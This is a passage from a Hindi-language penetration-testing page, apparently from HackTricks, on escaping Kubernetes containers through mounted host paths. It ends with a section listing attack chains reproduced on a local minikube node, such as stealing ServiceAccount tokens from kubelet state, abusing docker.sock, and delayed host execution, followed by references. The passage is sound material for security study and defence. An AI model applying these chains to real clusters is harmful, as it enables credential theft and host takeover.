- Mounted `/var` paths की समीक्षा में केवल filesystem ही नहीं, बल्कि credentials और पड़ोसी workloads भी शामिल होने चाहिए।
- Kubelet state directories और CNI/plugin paths को runtime sockets जितनी ही प्राथमिकता मिलनी चाहिए, क्योंकि वे अक्सर सीधे node के pod-creation और credential-distribution path पर होते हैं।

## स्थानीय सत्यापन स्थिति

इस पेज पर दी गई व्यावहारिक chains को एक स्थानीय Linux minikube node पर जाँचा गया। सत्यापन में ये चीज़ें दोहराई गईं:

- एक अस्थायी writable hostPath के ज़रिए read और write access
- `/var/lib/kubelet/pods` के ज़रिए projected ServiceAccount tokens और mounted Secrets की खोज
- उस mounted kubelet state से प्राप्त live token के साथ सफल Kubernetes API authentication
- mounted `/var` के ज़रिए पड़ोसी Docker `overlay2` filesystem की read-only खोज
- mounted `docker.sock` के ज़रिए Docker API से read-only host bind वाला sibling container बनाना
- host द्वारा consume किए जाने वाले अस्थायी hook के ज़रिए विलंबित host execution
- CNI-wrapper simulation, जिसमें मूल plugin के arguments, standard input, और execution को बरकरार रखा गया

इसी node ने `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore`, और `config.gz` को expose किया, लेकिन `uevent_helper`, EFI variables, thermal entries, या `sched_debug` को expose नहीं किया। Destructive kernel triggers नहीं चलाए गए। इससे पुष्टि होती है कि host-root, `/var`, kubelet-state, socket, और host-consumer chains को दोहराया जा सकता है, जबकि procfs/sysfs helper techniques को सटीक kernel, mount mode, payload path, और trigger पर निर्भर मानना चाहिए।

## References

- [1] [Kubelet द्वारा इस्तेमाल की जाने वाली स्थानीय फ़ाइलें और paths](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [cilium-agent container, `hostPath` mount के ज़रिए host तक पहुँच सकता है](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
